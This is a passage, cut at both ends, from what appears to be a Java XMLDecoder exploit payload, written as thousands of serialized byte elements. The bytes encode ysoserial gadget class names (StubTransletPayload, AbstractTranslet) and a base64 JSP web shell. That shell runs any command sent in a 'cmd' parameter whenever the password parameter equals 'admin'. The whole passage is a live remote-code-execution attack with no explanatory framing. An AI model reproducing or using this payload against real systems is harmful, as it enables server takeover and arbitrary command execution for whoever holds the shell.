index=\"1389\"><byte>111</byte></void><void index=\"1390\"><byte>115</byte></void><void index=\"1391\"><byte>101</byte></void><void index=\"1392\"><byte>114</byte></void><void index=\"1393\"><byte>105</byte></void><void index=\"1394\"><byte>97</byte></void><void index=\"1395\"><byte>108</byte></void><void index=\"1396\"><byte>47</byte></void><void index=\"1397\"><byte>112</byte></void><void index=\"1398\"><byte>97</byte></void><void index=\"1399\"><byte>121</byte></void><void index=\"1400\"><byte>108</byte></void><void index=\"1401\"><byte>111</byte></void><void index=\"1402\"><byte>97</byte></void><void index=\"1403\"><byte>100</byte></void><void index=\"1404\"><byte>115</byte></void><void index=\"1405\"><byte>47</byte></void><void index=\"1406\"><byte>117</byte></void><void index=\"1407\"><byte>116</byte></void><void index=\"1408\"><byte>105</byte></void><void index=\"1409\"><byte>108</byte></void><void index=\"1410\"><byte>47</byte></void><void index=\"1411\"><byte>71</byte></void><void index=\"1412\"><byte>97</byte></void><void index=\"1413\"><byte>100</byte></void><void index=\"1414\"><byte>103</byte></void><void index=\"1415\"><byte>101</byte></void><void index=\"1416\"><byte>116</byte></void><void index=\"1417\"><byte>115</byte></void><void index=\"1418\"><byte>36</byte></void><void index=\"1419\"><byte>83</byte></void><void index=\"1420\"><byte>116</byte></void><void index=\"1421\"><byte>117</byte></void><void index=\"1422\"><byte>98</byte></void><void index=\"1423\"><byte>84</byte></void><void index=\"1424\"><byte>114</byte></void><void index=\"1425\"><byte>97</byte></void><void index=\"1426\"><byte>110</byte></void><void index=\"1427\"><byte>115</byte></void><void index=\"1428\"><byte>108</byte></void><void index=\"1429\"><byte>101</byte></void><void index=\"1430\"><byte>116</byte></void><void index=\"1431\"><byte>80</byte></void><void index=\"1432\"><byte>97</byte></void><void index=\"1433\"><byte>121</byte></void><void index=\"1434\"><byte>108</byte></void><void index=\"1435\"><byte>111</byte></void><void index=\"1436\"><byte>97</byte></void><void index=\"1437\"><byte>100</byte></void><void index=\"1438\"><byte>1</byte></void><void index=\"1439\"><byte>0</byte></void><void index=\"1440\"><byte>64</byte></void><void index=\"1441\"><byte>99</byte></void><void index=\"1442\"><byte>111</byte></void><void index=\"1443\"><byte>109</byte></void><void index=\"1444\"><byte>47</byte></void><void index=\"1445\"><byte>115</byte></void><void index=\"1446\"><byte>117</byte></void><void index=\"1447\"><byte>110</byte></void><void index=\"1448\"><byte>47</byte></void><void index=\"1449\"><byte>111</byte></void><void index=\"1450\"><byte>114</byte></void><void index=\"1451\"><byte>103</byte></void><void index=\"1452\"><byte>47</byte></void><void index=\"1453\"><byte>97</byte></void><void index=\"1454\"><byte>112</byte></void><void index=\"1455\"><byte>97</byte></void><void index=\"1456\"><byte>99</byte></void><void index=\"1457\"><byte>104</byte></void><void index=\"1458\"><byte>101</byte></void><void index=\"1459\"><byte>47</byte></void><void index=\"1460\"><byte>120</byte></void><void index=\"1461\"><byte>97</byte></void><void index=\"1462\"><byte>108</byte></void><void index=\"1463\"><byte>97</byte></void><void index=\"1464\"><byte>110</byte></void><void index=\"1465\"><byte>47</byte></void><void index=\"1466\"><byte>105</byte></void><void index=\"1467\"><byte>110</byte></void><void index=\"1468\"><byte>116</byte></void><void index=\"1469\"><byte>101</byte></void><void index=\"1470\"><byte>114</byte></void><void index=\"1471\"><byte>110</byte></void><void index=\"1472\"><byte>97</byte></void><void index=\"1473\"><byte>108</byte></void><void index=\"1474\"><byte>47</byte></void><void index=\"1475\"><byte>120</byte></void><void index=\"1476\"><byte>115</byte></void><void index=\"1477\"><byte>108</byte></void><void index=\"1478\"><byte>116</byte></void><void index=\"1479\"><byte>99</byte></void><void index=\"1480\"><byte>47</byte></void><void index=\"1481\"><byte>114</byte></void><void index=\"1482\"><byte>117</byte></void><void index=\"1483\"><byte>110</byte></void><void index=\"1484\"><byte>116</byte></void><void index=\"1485\"><byte>105</byte></void><void index=\"1486\"><byte>109</byte></void><void index=\"1487\"><byte>101</byte></void><void index=\"1488\"><byte>47</byte></void><void index=\"1489\"><byte>65</byte></void><void index=\"1490\"><byte>98</byte></void><void index=\"1491\"><byte>115</byte></void><void index=\"1492\"><byte>116</byte></void><void index=\"1493\"><byte>114</byte></void><void index=\"1494\"><byte>97</byte></void><void index=\"1495\"><byte>99</byte></void><void index=\"1496\"><byte>116</byte></void><void index=\"1497\"><byte>84</byte></void><void index=\"1498\"><byte>114</byte></void><void index=\"1499\"><byte>97</byte></void><void index=\"1500\"><byte>110</byte></void><void index=\"1501\"><byte>115</byte></void><void index=\"1502\"><byte>108</byte></void><void index=\"1503\"><byte>101</byte></void><void index=\"1504\"><byte>116</byte></void><void index=\"1505\"><byte>1</byte></void><void index=\"1506\"><byte>0</byte></void><void index=\"1507\"><byte>20</byte></void><void index=\"1508\"><byte>106</byte></void><void index=\"1509\"><byte>97</byte></void><void index=\"1510\"><byte>118</byte></void><void index=\"1511\"><byte>97</byte></void><void index=\"1512\"><byte>47</byte></void><void index=\"1513\"><byte>105</byte></void><void index=\"1514\"><byte>111</byte></void><void index=\"1515\"><byte>47</byte></void><void index=\"1516\"><byte>83</byte></void><void index=\"1517\"><byte>101</byte></void><void index=\"1518\"><byte>114</byte></void><void index=\"1519\"><byte>105</byte></void><void index=\"1520\"><byte>97</byte></void><void index=\"1521\"><byte>108</byte></void><void index=\"1522\"><byte>105</byte></void><void index=\"1523\"><byte>122</byte></void><void index=\"1524\"><byte>97</byte></void><void index=\"1525\"><byte>98</byte></void><void index=\"1526\"><byte>108</byte></void><void index=\"1527\"><byte>101</byte></void><void index=\"1528\"><byte>1</byte></void><void index=\"1529\"><byte>0</byte></void><void index=\"1530\"><byte>57</byte></void><void index=\"1531\"><byte>99</byte></void><void index=\"1532\"><byte>111</byte></void><void index=\"1533\"><byte>109</byte></void><void index=\"1534\"><byte>47</byte></void><void index=\"1535\"><byte>115</byte></void><void index=\"1536\"><byte>117</byte></void><void index=\"1537\"><byte>110</byte></void><void index=\"1538\"><byte>47</byte></void><void index=\"1539\"><byte>111</byte></void><void index=\"1540\"><byte>114</byte></void><void index=\"1541\"><byte>103</byte></void><void index=\"1542\"><byte>47</byte></void><void index=\"1543\"><byte>97</byte></void><void index=\"1544\"><byte>112</byte></void><void index=\"1545\"><byte>97</byte></void><void index=\"1546\"><byte>99</byte></void><void index=\"1547\"><byte>104</byte></void><void index=\"1548\"><byte>101</byte></void><void index=\"1549\"><byte>47</byte></void><void index=\"1550\"><byte>120</byte></void><void index=\"1551\"><byte>97</byte></void><void index=\"1552\"><byte>108</byte></void><void index=\"1553\"><byte>97</byte></void><void index=\"1554\"><byte>110</byte></void><void index=\"1555\"><byte>47</byte></void><void index=\"1556\"><byte>105</byte></void><void index=\"1557\"><byte>110</byte></void><void index=\"1558\"><byte>116</byte></void><void index=\"1559\"><byte>101</byte></void><void index=\"1560\"><byte>114</byte></void><void index=\"1561\"><byte>110</byte></void><void index=\"1562\"><byte>97</byte></void><void index=\"1563\"><byte>108</byte></void><void index=\"1564\"><byte>47</byte></void><void index=\"1565\"><byte>120</byte></void><void index=\"1566\"><byte>115</byte></void><void index=\"1567\"><byte>108</byte></void><void index=\"1568\"><byte>116</byte></void><void index=\"1569\"><byte>99</byte></void><void index=\"1570\"><byte>47</byte></void><void index=\"1571\"><byte>84</byte></void><void index=\"1572\"><byte>114</byte></void><void index=\"1573\"><byte>97</byte></void><void index=\"1574\"><byte>110</byte></void><void index=\"1575\"><byte>115</byte></void><void index=\"1576\"><byte>108</byte></void><void index=\"1577\"><byte>101</byte></void><void index=\"1578\"><byte>116</byte></void><void index=\"1579\"><byte>69</byte></void><void index=\"1580\"><byte>120</byte></void><void index=\"1581\"><byte>99</byte></void><void index=\"1582\"><byte>101</byte></void><void index=\"1583\"><byte>112</byte></void><void index=\"1584\"><byte>116</byte></void><void index=\"1585\"><byte>105</byte></void><void index=\"1586\"><byte>111</byte></void><void index=\"1587\"><byte>110</byte></void><void index=\"1588\"><byte>1</byte></void><void index=\"1589\"><byte>0</byte></void><void index=\"1590\"><byte>31</byte></void><void index=\"1591\"><byte>121</byte></void><void index=\"1592\"><byte>115</byte></void><void index=\"1593\"><byte>111</byte></void><void index=\"1594\"><byte>115</byte></void><void index=\"1595\"><byte>101</byte></void><void index=\"1596\"><byte>114</byte></void><void index=\"1597\"><byte>105</byte></void><void index=\"1598\"><byte>97</byte></void><void index=\"1599\"><byte>108</byte></void><void index=\"1600\"><byte>47</byte></void><void index=\"1601\"><byte>112</byte></void><void index=\"1602\"><byte>97</byte></void><void index=\"1603\"><byte>121</byte></void><void index=\"1604\"><byte>108</byte></void><void index=\"1605\"><byte>111</byte></void><void index=\"1606\"><byte>97</byte></void><void index=\"1607\"><byte>100</byte></void><void index=\"1608\"><byte>115</byte></void><void index=\"1609\"><byte>47</byte></void><void index=\"1610\"><byte>117</byte></void><void index=\"1611\"><byte>116</byte></void><void index=\"1612\"><byte>105</byte></void><void index=\"1613\"><byte>108</byte></void><void index=\"1614\"><byte>47</byte></void><void index=\"1615\"><byte>71</byte></void><void index=\"1616\"><byte>97</byte></void><void index=\"1617\"><byte>100</byte></void><void index=\"1618\"><byte>103</byte></void><void index=\"1619\"><byte>101</byte></void><void index=\"1620\"><byte>116</byte></void><void index=\"1621\"><byte>115</byte></void><void index=\"1622\"><byte>1</byte></void><void index=\"1623\"><byte>0</byte></void><void index=\"1624\"><byte>8</byte></void><void index=\"1625\"><byte>60</byte></void><void index=\"1626\"><byte>99</byte></void><void index=\"1627\"><byte>108</byte></void><void index=\"1628\"><byte>105</byte></void><void index=\"1629\"><byte>110</byte></void><void index=\"1630\"><byte>105</byte></void><void index=\"1631\"><byte>116</byte></void><void index=\"1632\"><byte>62</byte></void><void index=\"1633\"><byte>1</byte></void><void index=\"1634\"><byte>3</byte></void><void index=\"1635\"><byte>-104</byte></void><void index=\"1636\"><byte>80</byte></void><void index=\"1637\"><byte>67</byte></void><void index=\"1638\"><byte>86</byte></void><void index=\"1639\"><byte>65</byte></void><void index=\"1640\"><byte>73</byte></void><void index=\"1641\"><byte>72</byte></void><void index=\"1642\"><byte>66</byte></void><void index=\"1643\"><byte>104</byte></void><void index=\"1644\"><byte>90</byte></void><void index=\"1645\"><byte>50</byte></void><void index=\"1646\"><byte>85</byte></void><void index=\"1647\"><byte>103</byte></void><void index=\"1648\"><byte>98</byte></void><void index=\"1649\"><byte>71</byte></void><void index=\"1650\"><byte>70</byte></void><void index=\"1651\"><byte>117</byte></void><void index=\"1652\"><byte>90</byte></void><void index=\"1653\"><byte>51</byte></void><void index=\"1654\"><byte>86</byte></void><void index=\"1655\"><byte>104</byte></void><void index=\"1656\"><byte>90</byte></void><void index=\"1657\"><byte>50</byte></void><void index=\"1658\"><byte>85</byte></void><void index=\"1659\"><byte>57</byte></void><void index=\"1660\"><byte>73</byte></void><void index=\"1661\"><byte>109</byte></void><void index=\"1662\"><byte>112</byte></void><void index=\"1663\"><byte>104</byte></void><void index=\"1664\"><byte>100</byte></void><void index=\"1665\"><byte>109</byte></void><void index=\"1666\"><byte>69</byte></void><void index=\"1667\"><byte>105</byte></void><void index=\"1668\"><byte>73</byte></void><void index=\"1669\"><byte>71</byte></void><void index=\"1670\"><byte>78</byte></void><void index=\"1671\"><byte>118</byte></void><void index=\"1672\"><byte>98</byte></void><void index=\"1673\"><byte>110</byte></void><void index=\"1674\"><byte>82</byte></void><void index=\"1675\"><byte>108</byte></void><void index=\"1676\"><byte>98</byte></void><void index=\"1677\"><byte>110</byte></void><void index=\"1678\"><byte>82</byte></void><void index=\"1679\"><byte>85</byte></void><void index=\"1680\"><byte>101</byte></void><void index=\"1681\"><byte>88</byte></void><void index=\"1682\"><byte>66</byte></void><void index=\"1683\"><byte>108</byte></void><void index=\"1684\"><byte>80</byte></void><void index=\"1685\"><byte>83</byte></void><void index=\"1686\"><byte>74</byte></void><void index=\"1687\"><byte>48</byte></void><void index=\"1688\"><byte>90</byte></void><void index=\"1689\"><byte>88</byte></void><void index=\"1690\"><byte>104</byte></void><void index=\"1691\"><byte>48</byte></void><void index=\"1692\"><byte>76</byte></void><void index=\"1693\"><byte>50</byte></void><void index=\"1694\"><byte>104</byte></void><void index=\"1695\"><byte>48</byte></void><void index=\"1696\"><byte>98</byte></void><void index=\"1697\"><byte>87</byte></void><void index=\"1698\"><byte>119</byte></void><void index=\"1699\"><byte>55</byte></void><void index=\"1700\"><byte>73</byte></void><void index=\"1701\"><byte>71</byte></void><void index=\"1702\"><byte>78</byte></void><void index=\"1703\"><byte>111</byte></void><void index=\"1704\"><byte>89</byte></void><void index=\"1705\"><byte>88</byte></void><void index=\"1706\"><byte>74</byte></void><void index=\"1707\"><byte>122</byte></void><void index=\"1708\"><byte>90</byte></void><void index=\"1709\"><byte>88</byte></void><void index=\"1710\"><byte>81</byte></void><void index=\"1711\"><byte>57</byte></void><void index=\"1712\"><byte>82</byte></void><void index=\"1713\"><byte>48</byte></void><void index=\"1714\"><byte>74</byte></void><void index=\"1715\"><byte>76</byte></void><void index=\"1716\"><byte>73</byte></void><void index=\"1717\"><byte>103</byte></void><void index=\"1718\"><byte>111</byte></void><void index=\"1719\"><byte>103</byte></void><void index=\"1720\"><byte>73</byte></void><void index=\"1721\"><byte>67</byte></void><void index=\"1722\"><byte>65</byte></void><void index=\"1723\"><byte>103</byte></void><void index=\"1724\"><byte>99</byte></void><void index=\"1725\"><byte>71</byte></void><void index=\"1726\"><byte>70</byte></void><void index=\"1727\"><byte>110</byte></void><void index=\"1728\"><byte>90</byte></void><void index=\"1729\"><byte>85</byte></void><void index=\"1730\"><byte>86</byte></void><void index=\"1731\"><byte>117</byte></void><void index=\"1732\"><byte>89</byte></void><void index=\"1733\"><byte>50</byte></void><void index=\"1734\"><byte>57</byte></void><void index=\"1735\"><byte>107</byte></void><void index=\"1736\"><byte>97</byte></void><void index=\"1737\"><byte>87</byte></void><void index=\"1738\"><byte>53</byte></void><void index=\"1739\"><byte>110</byte></void><void index=\"1740\"><byte>80</byte></void><void index=\"1741\"><byte>83</byte></void><void index=\"1742\"><byte>74</byte></void><void index=\"1743\"><byte>86</byte></void><void index=\"1744\"><byte>86</byte></void><void index=\"1745\"><byte>69</byte></void><void index=\"1746\"><byte>89</byte></void><void index=\"1747\"><byte>116</byte></void><void index=\"1748\"><byte>79</byte></void><void index=\"1749\"><byte>67</byte></void><void index=\"1750\"><byte>73</byte></void><void index=\"1751\"><byte>108</byte></void><void index=\"1752\"><byte>80</byte></void><void index=\"1753\"><byte>103</byte></void><void index=\"1754\"><byte>111</byte></void><void index=\"1755\"><byte>56</byte></void><void index=\"1756\"><byte>73</byte></void><void index=\"1757\"><byte>85</byte></void><void index=\"1758\"><byte>82</byte></void><void index=\"1759\"><byte>80</byte></void><void index=\"1760\"><byte>81</byte></void><void index=\"1761\"><byte>49</byte></void><void index=\"1762\"><byte>82</byte></void><void index=\"1763\"><byte>90</byte></void><void index=\"1764\"><byte>85</byte></void><void index=\"1765\"><byte>69</byte></void><void index=\"1766\"><byte>85</byte></void><void index=\"1767\"><byte>103</byte></void><void index=\"1768\"><byte>97</byte></void><void index=\"1769\"><byte>72</byte></void><void index=\"1770\"><byte>82</byte></void><void index=\"1771\"><byte>116</byte></void><void index=\"1772\"><byte>98</byte></void><void index=\"1773\"><byte>67</byte></void><void index=\"1774\"><byte>66</byte></void><void index=\"1775\"><byte>81</byte></void><void index=\"1776\"><byte>86</byte></void><void index=\"1777\"><byte>85</byte></void><void index=\"1778\"><byte>74</byte></void><void index=\"1779\"><byte>77</byte></void><void index=\"1780\"><byte>83</byte></void><void index=\"1781\"><byte>85</byte></void><void index=\"1782\"><byte>77</byte></void><void index=\"1783\"><byte>103</byte></void><void index=\"1784\"><byte>73</byte></void><void index=\"1785\"><byte>105</byte></void><void index=\"1786\"><byte>48</byte></void><void index=\"1787\"><byte>118</byte></void><void index=\"1788\"><byte>76</byte></void><void index=\"1789\"><byte>49</byte></void><void index=\"1790\"><byte>99</byte></void><void index=\"1791\"><byte>122</byte></void><void index=\"1792\"><byte>81</byte></void><void index=\"1793\"><byte>121</byte></void><void index=\"1794\"><byte>56</byte></void><void index=\"1795\"><byte>118</byte></void><void index=\"1796\"><byte>82</byte></void><void index=\"1797\"><byte>70</byte></void><void index=\"1798\"><byte>82</byte></void><void index=\"1799\"><byte>69</byte></void><void index=\"1800\"><byte>73</byte></void><void index=\"1801\"><byte>69</byte></void><void index=\"1802\"><byte>104</byte></void><void index=\"1803\"><byte>85</byte></void><void index=\"1804\"><byte>84</byte></void><void index=\"1805\"><byte>85</byte></void><void index=\"1806\"><byte>119</byte></void><void index=\"1807\"><byte>103</byte></void><void index=\"1808\"><byte>78</byte></void><void index=\"1809\"><byte>67</byte></void><void index=\"1810\"><byte>52</byte></void><void index=\"1811\"><byte>119</byte></void><void index=\"1812\"><byte>77</byte></void><void index=\"1813\"><byte>83</byte></void><void index=\"1814\"><byte>66</byte></void><void index=\"1815\"><byte>85</byte></void><void index=\"1816\"><byte>99</byte></void><void index=\"1817\"><byte>109</byte></void><void index=\"1818\"><byte>70</byte></void><void index=\"1819\"><byte>117</byte></void><void index=\"1820\"><byte>99</byte></void><void index=\"1821\"><byte>50</byte></void><void index=\"1822\"><byte>108</byte></void><void index=\"1823\"><byte>48</byte></void><void index=\"1824\"><byte>97</byte></void><void index=\"1825\"><byte>87</byte></void><void index=\"1826\"><byte>57</byte></void><void index=\"1827\"><byte>117</byte></void><void index=\"1828\"><byte>89</byte></void><void index=\"1829\"><byte>87</byte></void><void index=\"1830\"><byte>119</byte></void><void index=\"1831\"><byte>118</byte></void><void index=\"1832\"><byte>76</byte></void><void index=\"1833\"><byte>48</byte></void><void index=\"1834\"><byte>86</byte></void><void index=\"1835\"><byte>79</byte></void><void index=\"1836\"><byte>73</byte></void><void index=\"1837\"><byte>105</byte></void><void index=\"1838\"><byte>65</byte></void><void index=\"1839\"><byte>105</byte></void><void index=\"1840\"><byte>97</byte></void><void index=\"1841\"><byte>72</byte></void><void index=\"1842\"><byte>82</byte></void><void index=\"1843\"><byte>48</byte></void><void index=\"1844\"><byte>99</byte></void><void index=\"1845\"><byte>68</byte></void><void index=\"1846\"><byte>111</byte></void><void index=\"1847\"><byte>118</byte></void><void index=\"1848\"><byte>76</byte></void><void index=\"1849\"><byte>51</byte></void><void index=\"1850\"><byte>100</byte></void><void index=\"1851\"><byte>51</byte></void><void index=\"1852\"><byte>100</byte></void><void index=\"1853\"><byte>121</byte></void><void index=\"1854\"><byte>53</byte></void><void index=\"1855\"><byte>51</byte></void><void index=\"1856\"><byte>77</byte></void><void index=\"1857\"><byte>121</byte></void><void index=\"1858\"><byte>53</byte></void><void index=\"1859\"><byte>118</byte></void><void index=\"1860\"><byte>99</byte></void><void index=\"1861\"><byte>109</byte></void><void index=\"1862\"><byte>99</byte></void><void index=\"1863\"><byte>118</byte></void><void index=\"1864\"><byte>86</byte></void><void index=\"1865\"><byte>70</byte></void><void index=\"1866\"><byte>73</byte></void><void index=\"1867\"><byte>118</byte></void><void index=\"1868\"><byte>97</byte></void><void index=\"1869\"><byte>72</byte></void><void index=\"1870\"><byte>82</byte></void><void index=\"1871\"><byte>116</byte></void><void index=\"1872\"><byte>98</byte></void><void index=\"1873\"><byte>68</byte></void><void index=\"1874\"><byte>81</byte></void><void index=\"1875\"><byte>118</byte></void><void index=\"1876\"><byte>98</byte></void><void index=\"1877\"><byte>71</byte></void><void index=\"1878\"><byte>57</byte></void><void index=\"1879\"><byte>118</byte></void><void index=\"1880\"><byte>99</byte></void><void index=\"1881\"><byte>50</byte></void><void index=\"1882\"><byte>85</byte></void><void index=\"1883\"><byte>117</byte></void><void index=\"1884\"><byte>90</byte></void><void index=\"1885\"><byte>72</byte></void><void index=\"1886\"><byte>82</byte></void><void index=\"1887\"><byte>107</byte></void><void index=\"1888\"><byte>73</byte></void><void index=\"1889\"><byte>106</byte></void><void index=\"1890\"><byte>52</byte></void><void index=\"1891\"><byte>75</byte></void><void index=\"1892\"><byte>80</byte></void><void index=\"1893\"><byte>71</byte></void><void index=\"1894\"><byte>104</byte></void><void index=\"1895\"><byte>48</byte></void><void index=\"1896\"><byte>98</byte></void><void index=\"1897\"><byte>87</byte></void><void index=\"1898\"><byte>119</byte></void><void index=\"1899\"><byte>43</byte></void><void index=\"1900\"><byte>67</byte></void><void index=\"1901\"><byte>105</byte></void><void index=\"1902\"><byte>65</byte></void><void index=\"1903\"><byte>103</byte></void><void index=\"1904\"><byte>73</byte></void><void index=\"1905\"><byte>67</byte></void><void index=\"1906\"><byte>65</byte></void><void index=\"1907\"><byte>56</byte></void><void index=\"1908\"><byte>89</byte></void><void index=\"1909\"><byte>109</byte></void><void index=\"1910\"><byte>57</byte></void><void index=\"1911\"><byte>107</byte></void><void index=\"1912\"><byte>101</byte></void><void index=\"1913\"><byte>84</byte></void><void index=\"1914\"><byte>52</byte></void><void index=\"1915\"><byte>75</byte></void><void index=\"1916\"><byte>73</byte></void><void index=\"1917\"><byte>67</byte></void><void index=\"1918\"><byte>65</byte></void><void index=\"1919\"><byte>103</byte></void><void index=\"1920\"><byte>73</byte></void><void index=\"1921\"><byte>67</byte></void><void index=\"1922\"><byte>65</byte></void><void index=\"1923\"><byte>103</byte></void><void index=\"1924\"><byte>73</byte></void><void index=\"1925\"><byte>67</byte></void><void index=\"1926\"><byte>65</byte></void><void index=\"1927\"><byte>56</byte></void><void index=\"1928\"><byte>74</byte></void><void index=\"1929\"><byte>81</byte></void><void index=\"1930\"><byte>111</byte></void><void index=\"1931\"><byte>103</byte></void><void index=\"1932\"><byte>73</byte></void><void index=\"1933\"><byte>67</byte></void><void index=\"1934\"><byte>65</byte></void><void index=\"1935\"><byte>103</byte></void><void index=\"1936\"><byte>73</byte></void><void index=\"1937\"><byte>67</byte></void><void index=\"1938\"><byte>65</byte></void><void index=\"1939\"><byte>103</byte></void><void index=\"1940\"><byte>73</byte></void><void index=\"1941\"><byte>71</byte></void><void index=\"1942\"><byte>108</byte></void><void index=\"1943\"><byte>109</byte></void><void index=\"1944\"><byte>73</byte></void><void index=\"1945\"><byte>67</byte></void><void index=\"1946\"><byte>103</byte></void><void index=\"1947\"><byte>105</byte></void><void index=\"1948\"><byte>89</byte></void><void index=\"1949\"><byte>87</byte></void><void index=\"1950\"><byte>82</byte></void><void index=\"1951\"><byte>116</byte></void><void index=\"1952\"><byte>97</byte></void><void index=\"1953\"><byte>87</byte></void><void index=\"1954\"><byte>52</byte></void><void index=\"1955\"><byte>105</byte></void><void index=\"1956\"><byte>76</byte></void><void index=\"1957\"><byte>109</byte></void><void index=\"1958\"><byte>86</byte></void><void index=\"1959\"><byte>120</byte></void><void index=\"1960\"><byte>100</byte></void><void index=\"1961\"><byte>87</byte></void><void index=\"1962\"><byte>70</byte></void><void index=\"1963\"><byte>115</byte></void><void index=\"1964\"><byte>99</byte></void><void index=\"1965\"><byte>121</byte></void><void index=\"1966\"><byte>104</byte></void><void index=\"1967\"><byte>121</byte></void><void index=\"1968\"><byte>90</byte></void><void index=\"1969\"><byte>88</byte></void><void index=\"1970\"><byte>70</byte></void><void index=\"1971\"><byte>49</byte></void><void index=\"1972\"><byte>90</byte></void><void index=\"1973\"><byte>88</byte></void><void index=\"1974\"><byte>78</byte></void><void index=\"1975\"><byte>48</byte></void><void index=\"1976\"><byte>76</byte></void><void index=\"1977\"><byte>109</byte></void><void index=\"1978\"><byte>100</byte></void><void index=\"1979\"><byte>108</byte></void><void index=\"1980\"><byte>100</byte></void><void index=\"1981\"><byte>70</byte></void><void index=\"1982\"><byte>66</byte></void><void index=\"1983\"><byte>104</byte></void><void index=\"1984\"><byte>99</byte></void><void index=\"1985\"><byte>109</byte></void><void index=\"1986\"><byte>70</byte></void><void index=\"1987\"><byte>116</byte></void><void index=\"1988\"><byte>90</byte></void><void index=\"1989\"><byte>88</byte></void><void index=\"1990\"><byte>82</byte></void><void index=\"1991\"><byte>108</byte></void><void index=\"1992\"><byte>99</byte></void><void index=\"1993\"><byte>105</byte></void><void index=\"1994\"><byte>103</byte></void><void index=\"1995\"><byte>105</byte></void><void index=\"1996\"><byte>99</byte></void><void index=\"1997\"><byte>72</byte></void><void index=\"1998\"><byte>100</byte></void><void index=\"1999\"><byte>107</byte></void><void index=\"2000\"><byte>73</byte></void><void index=\"2001\"><byte>105</byte></void><void index=\"2002\"><byte>107</byte></void><void index=\"2003\"><byte>112</byte></void><void index=\"2004\"><byte>75</byte></void><void index=\"2005\"><byte>83</byte></void><void index=\"2006\"><byte>66</byte></void><void index=\"2007\"><byte>55</byte></void><void index=\"2008\"><byte>67</byte></void><void index=\"2009\"><byte>105</byte></void><void index=\"2010\"><byte>65</byte></void><void index=\"2011\"><byte>103</byte></void><void index=\"2012\"><byte>73</byte></void><void index=\"2013\"><byte>67</byte></void><void index=\"2014\"><byte>65</byte></void><void index=\"2015\"><byte>103</byte></void><void index=\"2016\"><byte>73</byte></void><void index=\"2017\"><byte>67</byte></void><void index=\"2018\"><byte>65</byte></void><void index=\"2019\"><byte>103</byte></void><void index=\"2020\"><byte>73</byte></void><void index=\"2021\"><byte>67</byte></void><void index=\"2022\"><byte>65</byte></void><void index=\"2023\"><byte>103</byte></void><void index=\"2024\"><byte>73</byte></void><void index=\"2025\"><byte>71</byte></void><void index=\"2026\"><byte>112</byte></void><void index=\"2027\"><byte>104</byte></void><void index=\"2028\"><byte>100</byte></void><void index=\"2029\"><byte>109</byte></void><void index=\"2030\"><byte>69</byte></void><void index=\"2031\"><byte>117</byte></void><void index=\"2032\"><byte>97</byte></void><void index=\"2033\"><byte>87</byte></void><void index=\"2034\"><byte>56</byte></void><void index=\"2035\"><byte>117</byte></void><void index=\"2036\"><byte>83</byte></void><void index=\"2037\"><byte>87</byte></void><void index=\"2038\"><byte>53</byte></void><void index=\"2039\"><byte>119</byte></void><void index=\"2040\"><byte>100</byte></void><void index=\"2041\"><byte>88</byte></void><void index=\"2042\"><byte>82</byte></void><void index=\"2043\"><byte>84</byte></void><void index=\"2044\"><byte>100</byte></void><void index=\"2045\"><byte>72</byte></void><void index=\"2046\"><byte>74</byte></void><void index=\"2047\"><byte>108</byte></void><void index=\"2048\"><byte>89</byte></void><void index=\"2049\"><byte>87</byte></void><void index=\"2050\"><byte>48</byte></void><void index=\"2051\"><byte>103</byte></void><void index=\"2052\"><byte>97</byte></void><void index=\"2053\"><byte>87</byte></void><void index=\"2054\"><byte>53</byte></void><void index=\"2055\"><byte>119</byte></void><void index=\"2056\"><byte>100</byte></void><void index=\"2057\"><byte>88</byte></void><void index=\"2058\"><byte>81</byte></void><void index=\"2059\"><byte>103</byte></void><void index=\"2060\"><byte>80</byte></void><void index=\"2061\"><byte>83</byte></void><void index=\"2062\"><byte>66</byte></void><void index=\"2063\"><byte>83</byte></void><void index=\"2064\"><byte>100</byte></void><void index=\"2065\"><byte>87</byte></void><void index=\"2066\"><byte>53</byte></void><void index=\"2067\"><byte>48</byte></void><void index=\"2068\"><byte>97</byte></void><void index=\"2069\"><byte>87</byte></void><void index=\"2070\"><byte>49</byte></void><void index=\"2071\"><byte>108</byte></void><void index=\"2072\"><byte>76</byte></void><void index=\"2073\"><byte>109</byte></void><void index=\"2074\"><byte>100</byte></void><void index=\"2075\"><byte>108</byte></void><void index=\"2076\"><byte>100</byte></void><void index=\"2077\"><byte>70</byte></void><void index=\"2078\"><byte>74</byte></void><void index=\"2079\"><byte>49</byte></void><void index=\"2080\"><byte>98</byte></void><void index=\"2081\"><byte>110</byte></void><void index=\"2082\"><byte>82</byte></void><void index=\"2083\"><byte>112</byte></void><void index=\"2084\"><byte>98</byte></void><void index=\"2085\"><byte>87</byte></void><void index=\"2086\"><byte>85</byte></void><void index=\"2087\"><byte>111</byte></void><void index=\"2088\"><byte>75</byte></void><void index=\"2089\"><byte>83</byte></void><void index=\"2090\"><byte>53</byte></void><void index=\"2091\"><byte>108</byte></void><void index=\"2092\"><byte>101</byte></void><void index=\"2093\"><byte>71</byte></void><void index=\"2094\"><byte>86</byte></void><void index=\"2095\"><byte>106</byte></void><void index=\"2096\"><byte>75</byte></void><void index=\"2097\"><byte>72</byte></void><void index=\"2098\"><byte>74</byte></void><void index=\"2099\"><byte>108</byte></void><void index=\"2100\"><byte>99</byte></void><void index=\"2101\"><byte>88</byte></void><void index=\"2102\"><byte>86</byte></void><void index=\"2103\"><byte>108</byte></void><void index=\"2104\"><byte>99</byte></void><void index=\"2105\"><byte>51</byte></void><void index=\"2106\"><byte>81</byte></void><void index=\"2107\"><byte>117</byte></void><void index=\"2108\"><byte>90</byte></void><void index=\"2109\"><byte>50</byte></void><void index=\"2110\"><byte>86</byte></void><void index=\"2111\"><byte>48</byte></void><void index=\"2112\"><byte>85</byte></void><void index=\"2113\"><byte>71</byte></void><void index=\"2114\"><byte>70</byte></void><void index=\"2115\"><byte>121</byte></void><void index=\"2116\"><byte>89</byte></void><void index=\"2117\"><byte>87</byte></void><void index=\"2118\"><byte>49</byte></void><void index=\"2119\"><byte>108</byte></void><void index=\"2120\"><byte>100</byte></void><void index=\"2121\"><byte>71</byte></void><void index=\"2122\"><byte>86</byte></void><void index=\"2123\"><byte>121</byte></void><void index=\"2124\"><byte>75</byte></void><void index=\"2125\"><byte>67</byte></void><void index=\"2126\"><byte>74</byte></void><void index=\"2127\"><byte>106</byte></void><void index=\"2128\"><byte>98</byte></void><void index=\"2129\"><byte>87</byte></void><void index=\"2130\"><byte>81</byte></void><void index=\"2131\"><byte>105</byte></void><void index=\"2132\"><byte>75</byte></void><void index=\"2133\"><byte>83</byte></void><void index=\"2134\"><byte>107</byte></void><void index=\"2135\"><byte>117</byte></void><void index=\"2136\"><byte>90</byte></void><void index=\"2137\"><byte>50</byte></void><void 